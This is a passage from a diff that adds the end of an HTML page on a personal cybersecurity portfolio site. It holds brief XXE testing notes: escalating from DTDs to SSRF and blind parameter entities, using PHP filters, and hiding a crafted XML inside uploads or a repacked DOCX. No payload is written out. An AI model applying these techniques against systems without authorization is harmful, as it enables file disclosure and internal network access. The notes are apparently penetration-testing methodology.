+</p><p id="728c915f-7ffa-4127-8807-0fc395e0a95d" class="">Flow: Regular DTDs → SSRF? →blind (parameter)</p><ul id="7992a23b-0572-4549-9512-afa6751ebc29" class="bulleted-list"><li style="list-style-type:disc">Limited by one line? Try utilizing PHP filters</li></ul><p id="05648423-8264-420e-b0b3-5a293e4d5518" class="">
+</p><p id="e9103527-927f-4e45-9d5e-72cce51fb5af" class="">File upload functionality?</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b950deaa-5ee5-4c9a-829f-4574f088d921" class="code"><code class="language-Java">Create the payload in a .xml file and upload...
+Docx or other microsoft files... unzip docx file, add vulnerable xml and rezip
+</code></pre></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
